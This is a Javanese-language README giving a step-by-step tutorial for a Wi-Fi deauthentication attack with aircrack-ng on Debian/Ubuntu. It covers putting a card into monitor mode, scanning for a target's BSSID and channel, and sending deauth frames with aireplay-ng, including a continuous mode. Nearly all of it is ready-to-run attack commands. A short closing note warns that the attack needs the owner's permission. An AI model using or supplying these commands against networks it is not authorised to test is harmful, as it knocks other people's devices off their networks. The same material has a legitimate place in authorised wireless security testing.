[English](README.md) / [Bahasa](README-id.md) / Jawa
# Cara Deauthentication Attack migunakne `aircrack-ng` nde Linux

Mangkono panduan dhasar gawe ngelakoni serangan deauth nggae `aircrack-ng` nde sistem sing dhasar Ubuntu/Debian (kudune nde sistem liya podo ae):

---

## Kahanan

- Kartu Jaringan sing iso mode monitor karo packet injection (conto: Atheros AR9565)
- `aircrack-ng` wis kepasang, lek durung:
  
  ```bash
  sudo apt install aircrack-ng
  ```

## Sing kudu mok lakoni

1. **Mbukak Terminal**: Pijet `Ctrl + Alt + T` dingge mbukak terminal.

2. **Cek Jeneng Kertu Jaringan**: Cek jeneng kertu jaringanmu (conto: wlan0, wlp3s0), iso nggae:
   
    ```bash
    iwconfig
    ```

3. **Lebokke kertu jaringan nde mode monitor**: Nggae `airmon-ng`. Gantinen `wlan0` dadi jeneng kertu jaringanmu:
   
    ```bash
    sudo airmon-ng start wlan0
    ```
    Iso ae airmon-ng bakal ngganti jeneng jaringanmu (conto: `wlan0mon`, `wlp3s0mon`).

4. **Cek Meneg Jenenge**: Iso nggae `iwconfig` maneh:

   ```bash
   iwconfig
   ```
   Cek menawa jenenge tenan ganti (conto: `wlan0mon` `wlp3s0mon`) lek enda ganti, gae ae jeneng sakdurunge.

5. **Scan Jaringan**: Nggae `airodump-ng` dingge goleki jaringan sekitar, lan catet channel karo BSSID (alamat MAC) sasaranmu:

   ```bash
   sudo airodump-ng wlan0mon
   ```
   Iki bakal goleki jaringan nde kabeh channel. Lek wis cukup, pijet `Ctrl+C` ben mandek.

6. **Goleki Jaringan Target**: Bubar targetmu petuk, goleki maneh, nanging ditambahi '--channel' isinen nggae channel targetmu.
   
   ```bash
   sudo airodump-ng wlan0mon --channel 1
   ```
   Ganti `1` nggae channel targetmu.

7. **Lekasi Serangan Deauthentication**: Bukak terminal anyar trus lekasi serangan:

   ```bash
   sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
   ```
   Ganti `<BSSID>` nggae BSSID target.

   `-0` iku simbol dinggo deauthentication.\
   `5` iku jumlah e serangan sng bakal dikirim. Kenek diatur. `0` berarti enda mandek mandek.

8. **Penthelengi hasile**: Balik nde layar `airodump-ng`. perangkat sing kepedhot bakal ketara nyambung lan medhot meneh.

9. **Pateni Mode Monitor**: Bubar wis rampung, pateni mode monitor nggae:

   ```bash
   sudo airmon-ng stop wlan0mon
   ```
   Ganti `wlan0mon` nggae jeneng jaringanmu maeng, durung lali kan?

## Cathetan!!
- **Sing eling!**: Serangan deauthentication iku tumindak ala yen dilakoni tanpa ijin sing tepak. Sakdurunge nglakoni, ijin karo sing ndue panggon sik. 
- Pinter-pinteran nggae nde lingkunagn sing iso kok kontrol.
- Ngerti hukum karo aturan nde lingkunganmu babagan keamanan jaringan.
